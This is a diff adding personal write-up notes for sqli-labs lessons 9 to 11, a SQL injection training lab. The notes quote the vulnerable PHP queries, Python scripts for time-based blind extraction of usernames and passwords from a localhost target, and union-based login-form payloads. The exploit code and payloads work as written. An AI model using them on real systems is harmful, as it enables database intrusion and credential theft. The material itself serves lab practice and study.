@@ -140,5 +140,129 @@ $row = mysql_fetch_array($result);
 
 
 ## LESS-9
+```php
+$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";  
+$result=mysql_query($sql);  
+$row = mysql_fetch_array($result);  
+  
+   if($row)  
+   {   echo '<font size="5" color="#FFFF00">';      
+echo 'You are in...........';  
+   echo "<br>";  
+       echo "</font>";  
+   }  
+   else   
+{  
+   echo '<font size="5" color="#FFFF00">';  
+   echo 'You are in...........';  
+   //print_r(mysql_error());  
+   //echo "You have an error in your SQL syntax";   echo "</br></font>";     
+echo '<font color= "#0000ff" font size= 3>';     
+     
+}
+```
 
+```python
+# -*-coding:utf-8-*-  
+# ----anthor: wum0nster---- #  
+  
+import requests  
+import time  
+  
+  
+def sql_bool():  
+    req = ""  
+    for i in range(1,1000):  
+        low = 32  
+        high = 128  
+        # payload = "database()"  
+        # payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"        # payload = "select group_concat(column_name) from information_schema.columns where table_name='users'"        payload = "select group_concat(concat(username,'~',password)) from users"  
+        while low < high:  
+            mid = (low + high) // 2  
+            # url = f"http://127.0.0.1:8888/sqli-labs-master/Less-9/?id=1' and if(ascii(substr(database(),{i},1))>{mid},sleep(1),0) --+"  
+            url = f"http://127.0.0.1:8888/sqli-labs-master/Less-9/?id=1' and if(ascii(substr(({payload}),{i},1))>{mid},sleep(1),0) --+"  
+  
+            try:  
+                res = requests.get(url=url, timeout=1)  
+                high = mid  
+            except Exception as e:  
+                low = mid+1  
+  
+            print(payload)  
+        req = req + chr(low)  
+        print(req)  
+sql_bool()
+```
+
+## LESS-10
+
+```PHP
+$id = '"'.$id.'"';  
+$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";  
+$result=mysql_query($sql);  
+$row = mysql_fetch_array($result);  
+  
+   if($row)  
+   {   echo '<font size="5" color="#FFFF00">';      
+echo 'You are in...........';  
+   echo "<br>";  
+       echo "</font>";  
+   }  
+   else   
+{  
+   echo '<font size="5" color="#FFFF00">';  
+   echo 'You are in...........';  
+   //print_r(mysql_error());  
+   //echo "You have an error in your SQL syntax";   echo "</br></font>";     
+echo '<font color= "#0000ff" font size= 3>';     
+     
+}
+```
+
+```PYTHON
+# -*-coding:utf-8-*-  
+# ----anthor: wum0nster---- #  
+  
+import requests  
+import time  
+  
+  
+def sql_bool():  
+    req = ""  
+    for i in range(1, 1000):  
+        low = 32  
+        high = 128  
+        # payload = "database()"  
+        # payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"        # payload = "select group_concat(column_name) from information_schema.columns where table_name='users'"        payload = "select group_concat(concat(username,'~',password)) from users"  
+        while low < high:  
+            mid = (low + high) // 2  
+            url = f"http://127.0.0.1:8888/sqli-labs-master/Less-10/?id=1\" and if(ascii(substr(({payload}),{i},1))>{mid},sleep(1),0) --+ "  
+  
+            try:  
+                res = requests.get(url=url, timeout=1)  
+                high = mid  
+            except Exception as e:  
+                low = mid+1  
+  
+            print(url)  
+        req = req + chr(low)  
+        print(req)  
+sql_bool()
+```
+
+## LESS-11
+爆字段数
+![](attachment/Pasted%20image%2020230225152558.png)
+data : uname=1' union select 1,database() --+&passwd=1
+
+![](attachment/Pasted%20image%2020230225152715.png)
+
+data: uname=1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() --+&passwd=1
+![](attachment/Pasted%20image%2020230225153134.png)
+
+data： uname=1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' --+&passwd=1
+![](attachment/Pasted%20image%2020230225153304.png)
+
+data: uname=1' union select 1,group_concat(concat(username,'~',password)) from users --+&passwd=1
+![](attachment/Pasted%20image%2020230225153356.png)
 
